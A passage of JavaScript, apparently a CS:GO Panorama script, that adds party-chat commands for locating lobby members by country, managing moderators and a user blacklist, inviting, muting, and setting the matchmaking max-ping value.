'\n\t\t\t\t\t\t\t\t\tlet Maps = data.mapgroupname.split(',');\n\t\t\t\t\t\t\t\t\tlet CleanMaps = [];\n\t\t\t\t\t\t\t\t\tfor ( i=0; i<Maps.length; i++ ) {\n\t\t\t\t\t\t\t\t\t\tlet TextClean = Maps[i].substr(3, Maps[i].length);\n\t\t\t\t\t\t\t\t\t\tCleanMaps[i] = GameTypesAPI.GetFriendlyMapName(TextClean);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tmsg += CleanMaps.join(', ');\n\t\t\t\t\t\t\t\t} else if ( data.state == 'game' ) {\n\t\t\t\t\t\t\t\t\tmsg += `playing ${data.map} - ${data.status}`\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tmsg += ` Found no rich presence for ${steamid}`;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tUtilities.SayParty(msg);\n\t\t\t\t\t\t})\n\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\n\t\t// CountryNames thanks to sapphryus\n\t\tlet CountryNames = {KW:\"Kuwait\",MA:\"Morocco \",AF:\"Afghanistan\",AL:\"Albania\",DZ:\"Algeria\",AS:\"American Samoa\",AD:\"Andorra\",AO:\"Angola\",AI:\"Anguilla\",AQ:\"Antarctica\",AG:\"Antigua and Barbuda\",AR:\"Argentina\",AM:\"Armenia\",AW:\"Aruba\",AU:\"Australia\",AT:\"Austria\",AZ:\"Azerbaijan\",BS:\"Bahamas\",BH:\"Bahrain\",BD:\"Bangladesh\",BB:\"Barbados\",BY:\"Belarus\",BE:\"Belgium\",BZ:\"Belize\",BJ:\"Benin\",BM:\"Bermuda\",BT:\"Bhutan\",BO:\"Bolivia\",BA:\"Bosnia and Herzegovina\",BW:\"Botswana\",BV:\"Bouvet Island\",BR:\"Brazil\",IO:\"British Indian Ocean Territory\",BN:\"Brunei Darussalam\",BG:\"Bulgaria\",BF:\"Burkina Faso\",BI:\"Burundi\",KH:\"Cambodia\",CM:\"Cameroon\",CA:\"Canada\",CV:\"Cape Verde\",KY:\"Cayman Islands\",CF:\"Central African Republic\",TD:\"Chad\",CL:\"Chile\",CN:\"China\",CX:\"Christmas Island\",CC:\"Cocos (Keeling) Islands\",CO:\"Colombia\",KM:\"Comoros\",CG:\"Congo\",CD:\"Congo, the Democratic Republic of the\",CK:\"Cook Islands\",CR:\"Costa Rica\",CI:\"Cote D'Ivoire\",HR:\"Croatia\",CU:\"Cuba\",CY:\"Cyprus\",CZ:\"Czech Republic\",DK:\"Denmark\",DJ:\"Djibouti\",DM:\"Dominica\",DO:\"Dominican Republic\",EC:\"Ecuador\",EG:\"Egypt\",SV:\"El Salvador\",GQ:\"Equatorial Guinea\",ER:\"Eritrea\",EE:\"Estonia\",ET:\"Ethiopia\",FK:\"Falkland Islands (Malvinas)\",FO:\"Faroe Islands\",FJ:\"Fiji\",FI:\"Finland\",FR:\"France\",GF:\"French Guiana\",PF:\"French Polynesia\",TF:\"French Southern Territories\",GA:\"Gabon\",GM:\"Gambia\",GE:\"Georgia\",DE:\"Germany\",GH:\"Ghana\",GI:\"Gibraltar\",GR:\"Greece\",GL:\"Greenland\",GD:\"Grenada\",GP:\"Guadeloupe\",GU:\"Guam\",GT:\"Guatemala\",GN:\"Guinea\",GW:\"Guinea-Bissau\",GY:\"Guyana\",HT:\"Haiti\",HM:\"Heard Island and Mcdonald Islands\",VA:\"Holy See (Vatican City State)\",HN:\"Honduras\",HK:\"Hong Kong\",HU:\"Hungary\",IS:\"Iceland\",IN:\"India\",ID:\"Indonesia\",IR:\"Iran, Islamic Republic of\",IQ:\"Iraq\",IE:\"Ireland\",IL:\"Israel\",IT:\"Italy\",JM:\"Jamaica\",JP:\"Japan\",JO:\"Jordan\",KZ:\"Kazakhstan\",KE:\"Kenya\",KI:\"Kiribati\",KP:\"North Korea\",KR:\"South Korea\",KW:\"Kuwait\",KG:\"Kyrgyzstan\",LA:\"Lao People's Democratic Republic\",LV:\"Latvia\",LB:\"Lebanon\",LS:\"Lesotho\",LR:\"Liberia\",LY:\"Libya\",LI:\"Liechtenstein\",LT:\"Lithuania\",LU:\"Luxembourg\",MO:\"Macao\",MG:\"Madagascar\",MW:\"Malawi\",MY:\"Malaysia\",MV:\"Maldives\",ML:\"Mali\",MT:\"Malta\",MH:\"Marshall Islands\",MQ:\"Martinique\",MR:\"Mauritania\",MU:\"Mauritius\",YT:\"Mayotte\",MX:\"Mexico\",FM:\"Micronesia, Federated States of\",MD:\"Moldova, Republic of\",MC:\"Monaco\",MN:\"Mongolia\",MS:\"Montserrat\",MA:\"Morocco\",MZ:\"Mozambique\",MM:\"Myanmar\",NA:\"Namibia\",NR:\"Nauru\",NP:\"Nepal\",NL:\"Netherlands\",NC:\"New Caledonia\",NZ:\"New Zealand\",NI:\"Nicaragua\",NE:\"Niger\",NG:\"Nigeria\",NU:\"Niue\",NF:\"Norfolk Island\",MK:\"North Macedonia, Republic of\",MP:\"Northern Mariana Islands\",NO:\"Norway\",OM:\"Oman\",PK:\"Pakistan\",PW:\"Palau\",PS:\"Palestinian Territory, Occupied\",PA:\"Panama\",PG:\"Papua New Guinea\",PY:\"Paraguay\",PE:\"Peru\",PH:\"Philippines\",PN:\"Pitcairn\",PL:\"Poland\",PT:\"Portugal\",PR:\"Puerto Rico\",QA:\"Qatar\",RE:\"Reunion\",RO:\"Romania\",RU:\"Russia\",RW:\"Rwanda\",SH:\"Saint Helena\",KN:\"Saint Kitts and Nevis\",LC:\"Saint Lucia\",PM:\"Saint Pierre and Miquelon\",VC:\"Saint Vincent and the Grenadines\",WS:\"Samoa\",SM:\"San Marino\",ST:\"Sao Tome and Principe\",SA:\"Saudi Arabia\",SN:\"Senegal\",SC:\"Seychelles\",SL:\"Sierra Leone\",SG:\"Singapore\",SK:\"Slovakia\",SI:\"Slovenia\",SB:\"Solomon Islands\",SO:\"Somalia\",ZA:\"South Africa\",GS:\"South Georgia and the South Sandwich Islands\",ES:\"Spain\",LK:\"Sri Lanka\",SD:\"Sudan\",SR:\"Suriname\",SJ:\"Svalbard and Jan Mayen\",SZ:\"Eswatini\",SE:\"Sweden\",CH:\"Switzerland\",SY:\"Syrian Arab Republic\",TW:\"Taiwan\",TJ:\"Tajikistan\",TZ:\"Tanzania, United Republic of\",TH:\"Thailand\",TL:\"Timor-Leste\",TG:\"Togo\",TK:\"Tokelau\",TO:\"Tonga\",TT:\"Trinidad and Tobago\",TN:\"Tunisia\",TR:\"Turkey\",TM:\"Turkmenistan\",TC:\"Turks and Caicos Islands\",TV:\"Tuvalu\",UG:\"Uganda\",UA:\"Ukraine\",AE:\"United Arab Emirates\",GB:\"United Kingdom\",US:\"USA\",UM:\"United States Minor Outlying Islands\",UY:\"Uruguay\",UZ:\"Uzbekistan\",VU:\"Vanuatu\",VE:\"Venezuela\",VN:\"Vietnam\",VG:\"Virgin Islands, British\",VI:\"Virgin Islands, U.S.\",WF:\"Wallis and Futuna\",EH:\"Western Sahara\",YE:\"Yemen\",ZM:\"Zambia\",ZW:\"Zimbabwe\",AX:\"Åland Islands\",BQ:\"Bonaire, Sint Eustatius and Saba\",CW:\"Curaçao\",GG:\"Guernsey\",IM:\"Isle of Man\",JE:\"Jersey\",ME:\"Montenegro\",BL:\"Saint Barthélemy\",MF:\"Saint Martin (French part)\",RS:\"Serbia\",SX:\"Sint Maarten (Dutch part)\",SS:\"South Sudan\",XK:\"Kosovo\"}\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Locate (!\\u{200B}locate <partial:name>|<steamid>|<friendcode>)',\n\t\t\tcmds: ['locate', 'locs', 'loc', 'locations', 'location'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tlet XUID = 0;\n\t\t\t\tif ( typeof args[0] != 'undefined' ) {\n\t\t\t\t\tXUID = Utilities.FindPlayer(args[0])\n\t\t\t\t}\n\t\t\t\t\n\n\t\t\t\tlet Settings = LobbyAPI.GetSessionSettings();\n\t\t\t\tfor ( i=0; i<Settings.members.numMachines; i++ ) {\n\t\t\t\t\tlet Player = Settings.members[`machine${i}`];\n\t\t\t\t\tlet PlayerSteamID = Player.id;\n\t\t\t\t\tlet PlayerName = Player.player0.name;\n\t\t\t\t\tlet Location = Player.player0.game.loc;\n\t\t\t\t\tlet LocationFull = CountryNames[Location];\n\n\t\t\t\t\tif ( typeof args[0] == 'undefined' || PlayerSteamID == XUID ) {\n\t\t\t\t\t\tUtilities.SayParty(`[LOCATION] ${PlayerName} is from ${LocationFull}!`);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Mods (!\\u{200B}mod add <partial:name>|<steamid>|<friendcode>|<lobbyindex>)',\n\t\t\thelpTitle: 'Type \"!mod add <PartialName>\", \"!mod add <SteamID64>\", \"!mod add <FriendCode>\", \"!mod add <LobbyIndex>\"',\n\t\t\thelpExamples: 'Typing \"!mod add 2\" will mod the second person in the lobby, others are pretty easy like \"!mod add csmit\"!',\n\t\t\tcmds: ['mod'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( steamid == MyPersonaAPI.GetXuid() ) {\n\t\t\t\t\tUserData.mods = UserData.mods || [0];\n\t\t\t\t\tswitch(args[0]) {\n\t\t\t\t\t\tcase 'add':\n\t\t\t\t\t\t\tif ( typeof args[1] != 'undefined' ) {\n\t\t\t\t\t\t\t\tlet ModXUID = Utilities.FindPlayer(args[1]);\n\t\t\t\t\t\t\t\tif ( ModXUID ) {\n\t\t\t\t\t\t\t\t\tif ( UserData.mods.indexOf(ModXUID) == -1 ) {\n\t\t\t\t\t\t\t\t\t\tUserData.mods.push(ModXUID);\n\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(ModXUID);\n\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Added ${FriendName}(${ModXUID}) as a moderator!`);\n\t\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(ModXUID);\n\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Cannot add ${FriendName}(${ModXUID}) as they are already a moderator!`)\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Sorry! I don't know how to decipher: ${args[1]}`)\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase 'list':\n\t\t\t\t\t\t\tUserData.mods.forEach((steamid, index)=>{\n\t\t\t\t\t\t\t\tif ( steamid ) {\n\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(steamid);\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`[${index}] ${FriendName} - ${steamid}`);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t})\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase 'remove':\n\t\t\t\t\t\t\tif ( typeof args[1] != 'undefined' ) {\n\t\t\t\t\t\t\t\tif ( typeof UserData.mods[ parseInt(args[1]) ] == 'undefined' ) {\n\t\t\t\t\t\t\t\t\tlet ModXUID = Utilities.FindPlayer(args[1]);\n\t\t\t\t\t\t\t\t\tlet FoundIndex = UserData.mods.indexOf(ModXUID);\n\t\t\t\t\t\t\t\t\tif ( ModXUID && FoundIndex != -1 ) {\n\t\t\t\t\t\t\t\t\t\tlet FriendSteam = UserData.mods[FoundIndex];\n\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(FriendSteam);\n\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Removed ${FriendName} (${FriendSteam}) as a moderator!`);\n\t\t\t\t\t\t\t\t\t\tdelete UserData.mods[ FoundIndex ];\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tlet FriendSteam = UserData.mods[ parseInt(args[1]) ];\n\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(FriendSteam);\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Removed ${FriendName} (${FriendSteam}) as a moderator!`);\n\t\t\t\t\t\t\t\t\tdelete UserData.mods[ parseInt(args[1]) ];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase 'clear':\n\t\t\t\t\t\t\tlet TotalMods = UserData.mods.length || 0\n\t\t\t\t\t\t\tUtilities.SayParty(`Cleared ${TotalMods} records (incl removed and existing mods)!`);\n\t\t\t\t\t\t\tUserData.mods = [null];\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\tif ( typeof args[0] != 'undefined' ) {\n\t\t\t\t\t\t\t\tlet ModXUID = Utilities.FindPlayer(args[0]);\n\t\t\t\t\t\t\t\tif ( ModXUID && ModXUID != MySteamID ) {\n\t\t\t\t\t\t\t\t\tif ( UserData.mods.indexOf(ModXUID) == -1 ) {\n\t\t\t\t\t\t\t\t\t\tUserData.mods.push(ModXUID);\n\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(ModXUID);\n\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Added ${FriendName} (${ModXUID}) as a moderator!`);\n\t\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t\tlet FoundIndex = UserData.mods.indexOf(ModXUID);\n\t\t\t\t\t\t\t\t\t\tif ( FoundIndex != -1 ) {\n\t\t\t\t\t\t\t\t\t\t\tlet FriendSteam = UserData.mods[FoundIndex];\n\t\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(FriendSteam);\n\t\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Removed ${FriendName} (${FriendSteam}) as a moderator!`);\n\t\t\t\t\t\t\t\t\t\t\tdelete UserData.mods[ FoundIndex ];\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else if ( ModXUID == MySteamID ) {\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Nope! You cannot add yourself to the moderator!`)\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Sorry! I don't know how to decipher: ${args[0]}`)\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t}                \n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Blacklist (!\\u{200B}blacklist <partial:name>|<steamid>|<friendcode>|<lobbyindex>)',\n\t\t\thelpTitle: 'Type \"!blacklist add <PartialName>\", \"!blacklist add <SteamID64>\", \"!blacklist add <FriendCode>\", \"!blacklist add <LobbyIndex>\"',\n\t\t\thelpExamples: 'Typing \"!blacklist add 2\" will blacklist the second person in the lobby, others are pretty easy like \"!blacklist add csmit\"!',\n\t\t\tcmds: ['blacklist', 'bl'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( steamid == MyPersonaAPI.GetXuid() ) {\n\t\t\t\t\tUserData.blacklist = UserData.blacklist || [0];\n\t\t\t\t\tswitch(args[0]) {\n\t\t\t\t\t\tcase 'add':\n\t\t\t\t\t\t\tif ( typeof args[1] != 'undefined' ) {\n\t\t\t\t\t\t\t\tlet BlacklistXUID = Utilities.FindPlayer(args[1]);\n\t\t\t\t\t\t\t\tif ( BlacklistXUID && BlacklistXUID != MySteamID ) {\n\t\t\t\t\t\t\t\t\tif ( UserData.blacklist.indexOf(BlacklistXUID) == -1 ) {\n\t\t\t\t\t\t\t\t\t\tUserData.blacklist.push(BlacklistXUID);\n\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(BlacklistXUID);\n\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Added ${FriendName} (${BlacklistXUID}) to blacklist!`);\n\t\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(BlacklistXUID);\n\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Cannot add ${FriendName}(${BlacklistXUID}) to blacklist!`)\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else if ( BlacklistXUID == MySteamID ) {\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Nope! You cannot add yourself to the blacklist!`)\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Sorry! I don't know how to decipher: ${args[1]}`)\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase 'list':\n\t\t\t\t\t\t\tUserData.blacklist.forEach((steamid, index)=>{\n\t\t\t\t\t\t\t\tif ( steamid ) {\n\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(steamid);\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`[${index}] ${FriendName} - ${steamid}`);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t})\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase 'remove':\n\t\t\t\t\t\t\tif ( typeof args[1] != 'undefined' ) {\n\t\t\t\t\t\t\t\tif ( typeof UserData.blacklist[ parseInt(args[1]) ] == 'undefined' ) {\n\t\t\t\t\t\t\t\t\tlet BlacklistXUID = Utilities.FindPlayer(args[1]);\n\t\t\t\t\t\t\t\t\tlet FoundIndex = UserData.blacklist.indexOf(BlacklistXUID);\n\t\t\t\t\t\t\t\t\tif ( BlacklistXUID && FoundIndex != -1 ) {\n\t\t\t\t\t\t\t\t\t\tlet FriendSteam = UserData.blacklist[FoundIndex];\n\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(FriendSteam);\n\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Removed ${FriendName} (${FriendSteam}) from blacklist!`);\n\t\t\t\t\t\t\t\t\t\tdelete UserData.blacklist[ FoundIndex ];\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tlet FriendSteam = UserData.blacklist[ parseInt(args[1]) ];\n\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(FriendSteam);\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Removed ${FriendName} (${FriendSteam}) from blacklist!`);\n\t\t\t\t\t\t\t\t\tdelete UserData.blacklist[ parseInt(args[1]) ];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tcase 'clear':\n\t\t\t\t\t\t\tlet TotalBlacklist = UserData.blacklist.length || 0\n\t\t\t\t\t\t\tUtilities.SayParty(`Cleared ${TotalBlacklist} records (incl removed and existing blacklists)!`);\n\t\t\t\t\t\t\tUserData.blacklist = [0];\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\tif ( typeof args[0] != 'undefined' ) {\n\t\t\t\t\t\t\t\tlet BlacklistXUID = Utilities.FindPlayer(args[0]);\n\t\t\t\t\t\t\t\tif ( BlacklistXUID && BlacklistXUID != MySteamID ) {\n\t\t\t\t\t\t\t\t\tif ( UserData.blacklist.indexOf(BlacklistXUID) == -1 ) {\n\t\t\t\t\t\t\t\t\t\tUserData.blacklist.push(BlacklistXUID);\n\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(BlacklistXUID);\n\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Added ${FriendName} (${BlacklistXUID}) to blacklist!`);\n\t\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\t\tlet FoundIndex = UserData.blacklist.indexOf(BlacklistXUID);\n\t\t\t\t\t\t\t\t\t\tif ( FoundIndex != -1 ) {\n\t\t\t\t\t\t\t\t\t\t\tlet FriendSteam = UserData.blacklist[FoundIndex];\n\t\t\t\t\t\t\t\t\t\t\tlet FriendName = FriendsListAPI.GetFriendName(FriendSteam);\n\t\t\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Removed ${FriendName} (${FriendSteam}) from blacklist!`);\n\t\t\t\t\t\t\t\t\t\t\tdelete UserData.blacklist[ FoundIndex ];\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t} else if ( BlacklistXUID == MySteamID ) {\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Nope! You cannot add yourself to the blacklist!`)\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tUtilities.SayParty(`Sorry! I don't know how to decipher: ${args[1]}`)\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t}                \n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Invite (!\\u{200B}invite <steamid>|<friendcode>)',\n\t\t\tcmds: ['inv', 'invite', 'add'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\n\t\t\t\tUtilities.FindPlayer(args[0], false, (steamid)=>{\n\t\t\t\t\tFriendsListAPI.ActionInviteFriend(steamid, '')\n\t\t\t\t})\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'WhoInvited (!\\u{200B}who <steamid>|<friendcode>)',\n\t\t\tcmds: ['who', 'whoinv', 'whoinvite', 'whoinvited'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\n\t\t\t\tlet XUID = 0;\n\t\t\t\tif ( typeof args[0] != 'undefined' ) {\n\t\t\t\t\tXUID = Utilities.FindPlayer(args[0])\n\t\t\t\t}\n\n\t\t\t\tif ( XUID != 0 ) {\n\t\t\t\t\tlet LobbyData = LobbyAPI.GetSessionSettings()\n\t\t\t\t\tfor ( i=0; i<LobbyData.members.numMachines; i++ ) {\n\t\t\t\t\t\tlet Machine = LobbyData.members[`machine${i}`]\n\t\t\t\t\t\tif ( Machine && XUID == Machine.id ) {\n\t\t\t\t\t\t\tlet jfriend = Machine['player0'].game.jfriend\n\t\t\t\t\t\t\tlet jfriendName = FriendsListAPI.GetFriendName(jfriend);\n\t\t\t\t\t\t\tlet friendName = FriendsListAPI.GetFriendName(XUID);\n\t\t\t\t\t\t\tif ( jfriend ) {\t\t\n\t\t\t\t\t\t\t\tUtilities.SayParty(`${friendName} was invited by ${jfriendName} (${jfriend})!`);\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tUtilities.SayParty(`Couldn't find who invited ${friendName}!`);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Mute (!\\u{200B}mute <steamid>|<friendcode>)',\n\t\t\tcmds: ['mute', 'm', 'quiet', 'silence', 'ignore', 'block'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\n\t\t\t\tlet XUID = 0;\n\t\t\t\tif ( typeof args[0] != 'undefined' ) {\n\t\t\t\t\tXUID = Utilities.FindPlayer(args[0])\n\t\t\t\t}\n\n\t\t\t\tif ( XUID != 0 ) {\n\t\t\t\t\tlet friendName = FriendsListAPI.GetFriendName(XUID);\n\t\t\t\t\tMuteUsers.push(XUID);\n\t\t\t\t\tUtilities.SayParty(`${friendName} is now muted!`);\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Ping (!\\u{200B}ping <ping> [ <target> ] or !ping)',\n\t\t\tcmds: ['ping', 'maxping', 'p'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tlet BaseCMD = 'mm_dedicated_search_maxping'\n\t\t\t\tlet MyPing = GameInterfaceAPI.GetSettingString(BaseCMD);\n\n\t\t\t\tif ( /((?:\\d\\s){3}\\d)/.test(MyPing) ) {\n\t\t\t\t\tMyPing = '> 1000'\n\t\t\t\t} else {\n\t\t\t\t\tMyPing = '< ' + Math.trunc(MyPing)\n\t\t\t\t}\n\n\t\t\t\tswitch (args.length) {\n\t\t\t\t\tcase 0:\n\t\t\t\t\t\t// Print current ping\n\t\t\t\t\t\tUtilities.SayParty(`[PING] My ping is: ${MyPing}`);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 1:\n\t\t\t\t\t\t// Set Ping to Arg0\n\t\t\t\t\t\tlet RequestedPing = Math.trunc(args[0]);\n\t\t\t\t\t\tif ( RequestedPing == '0' ) {\n\t\t\t\t\t\t\tRequestedPing = '0 0 0 4'\n\t\t\t\t\t\t}\n\t\t\t\t\t\tGameInterfaceAPI.ConsoleCommand(`${BaseCMD} ${RequestedPing}`)\n\t\t\t\t\t\tUtilities.SayParty(`[PING] I set ping to: ${RequestedPing}`);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 2:\n\t\t\t\t\t\t// If Arg1 == Me, set Ping to Arg0\n\t\t\t\t\t\tlet XUID = Utilities.FindPlayer(args[1]);\n\t\t\t\t\t\tif ( XUID != 0 && XUID == MySteamID ) {\n\t\t\t\t\t\t\tlet RequestedPing = Math.trunc(args[0]);\n\t\t\t\t\t\t\tif ( RequestedPing == '0' ) {\n\t\t\t\t\t\t\t\tRequestedPing = '0 0 0 4'\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tGameInterfaceAPI.ConsoleCommand(`${BaseCMD} ${RequestedPing}`)\n\t\t\t\t\t\t\tUtilities.SayParty(`[PING] I set ping to: ${RequestedPing}`);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\n\t\t// Ignore Initial Chat\n\t\tlet PreprocessChat = () => {\n\t\t\tlet party_chat = $.GetContextPanel().FindChildTraverse(\"PartyChat\")\n\t\t\tif(party_chat) {\n\t\t\t\tlet chat_lines = party_chat.FindChildTraverse(\"ChatLinesContainer\")\n\t\t\t\tif(chat_lines) {\n\t\t\t\t\tchat_lines.Children().reverse().forEach(el => {\n\t\t\t\t\t\tlet child = el.GetChild(0)\n\t\t\t\t\t\tif ( child && child.BHasClass('left-right-flow') && child.BHasClass('horizontal-align-left') ) {\n\t\t\t\t\t\t\tif ( child.GetChildCount() == 2 ) {\n\t\t\t\t\t\t\t\tMsgSteamID = child.Children()[0].steamid;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( !child.BHasClass('cp_processed') ) {\n\t\t\t\t\t\t\t\tchild.AddClass('cp_processed');\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t})\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tPreprocessChat();\n\n\t\tlet ProcessChat = false;\n\t\tlet Shutdown = false;\n\t\tlet Timeouts = [];\n\t\tlet PartyChatLoop = ()=>{\n\t\t\tlet party_chat = $.GetContextPanel().FindChildTraverse(\"PartyChat\")\n\t\t\tif(party_chat) {\n\t\t\t\tlet chat_lines = party_chat.FindChildTraverse(\"ChatLinesContainer\")\n\t\t\t\tif(chat_lines) {\n\t\t\t\t\tchat_lines.Children().forEach(el => {\n\t\t\t\t\t\tlet child = el.GetChild(0)\n\t\t\t\t\t\tif ( child && child.BHasClass('left-right-flow') && child.BHasClass('horizontal-align-left') ) {\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\tif ( child.BHasClass('cp_processed') ) return false;\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tlet InnerChild = child.GetChild(child.GetChildCount()-1);\n\t\t\t\t\t\t\t\tif ( InnerChild && InnerChild.text ) {\n\t\t\t\t\t\t\t\t\tlet Sender = $.Localize('{s:player_name}', InnerChild);\n\t\t\t\t\t\t\t\t\tlet Message = $.Localize('{s:msg}', InnerChild);\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t//var Message = InnerChild.text.toLowerCase()\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\tif (!Message.startsWith(Prefix)) return;\n\n\t\t\t\t\t\t\t\t\tif ( child.GetChildCount() == 2 ) {\n\t\t\t\t\t\t\t\t\t\tMsgSteamID = child.Children()[0].steamid;\n\t\t\t\t\t\t\t\t\t}\n\n\n\n\t\t\t\t\t\t\t\t\tif ( MuteUsers.includes(MsgSteamID) ) {\n\t\t\t\t\t\t\t\t\t\t//return el.RemoveAndDeleteChildren();\n\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\tconst args = Message.slice(Prefix.length).trim().split(' ');\n\t\t\t\t\t\t\t\t\tconst command = args.shift().toLowerCase();\n\n\t\t\t\t\t\t\t\t\tfor ( index=0; index < PartyChatCommands.length; index++ ) {\n\t\t\t\t\t\t\t\t\t\tconst ChatCommand = PartyChatCommands[index];\n\t\t\t\t\t\t\t\t\t\tfor ( i=0; i<ChatCommand.cmds.length; i++ ) {\n\t\t\t\t\t\t\t\t\t\t\tconst Alias = ChatCommand.cmds[i]; \n\t\t\t\t\t\t\t\t\t\t\tif ( 